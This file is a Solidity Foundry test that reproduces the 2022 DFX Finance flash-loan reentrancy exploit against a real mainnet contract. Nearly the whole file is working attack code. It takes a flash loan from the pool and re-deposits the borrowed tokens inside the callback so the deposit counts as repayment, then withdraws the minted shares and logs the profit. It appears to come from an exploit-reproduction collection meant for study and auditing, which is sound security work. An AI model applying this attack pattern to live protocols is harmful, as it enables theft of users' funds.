// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo 

// key words: @flashloan @reentrancy
// date: 2022.11.11
// total Lost: 4 million$
// network: Mainnet
// Attacker: 
// Attack Contract: 0x6cfa86a352339e766ff1ca119c8c40824f41f22d
// Vulnerable Contract: 0x46161158b1947d9149e066d6d31af1283b2d377c
// Attack Tx: 0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7

// @Info
// Vulnerable Contract Code : 0x46161158b1947d9149e066d6d31af1283b2d377c

// @Analysis
// blog: https://www.levi104.com/2023/07/15/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/


// forge test --match-path test/DFX.sol
contract DFXTest is DSTest{
    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Curve dfx = Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    uint256 receiption;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15941703);
    }

    function testExploit() public{
        address(WETH).call{value: 2 ether}("");
        WETH.approve(address(Router), type(uint).max);
        USDC.approve(address(Router), type(uint).max);
        USDC.approve(address(dfx), type(uint).max);
        XIDR.approve(address(Router), type(uint).max);
        XIDR.approve(address(dfx), type(uint).max);

        WETHToUSDC();

        emit log_named_decimal_uint(
            "[Before] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),
            6
        );

        USDCToXIDR();
        uint[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee
        dfx.withdraw(receiption, block.timestamp + 60);
        XIDRToUSDC();

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            6
        );

    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
        (receiption, ) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);
    }

    function WETHToUSDC() internal{
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function USDCToXIDR() internal{
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(XIDR),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function XIDRToUSDC() internal{
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(XIDR),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: XIDR.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

}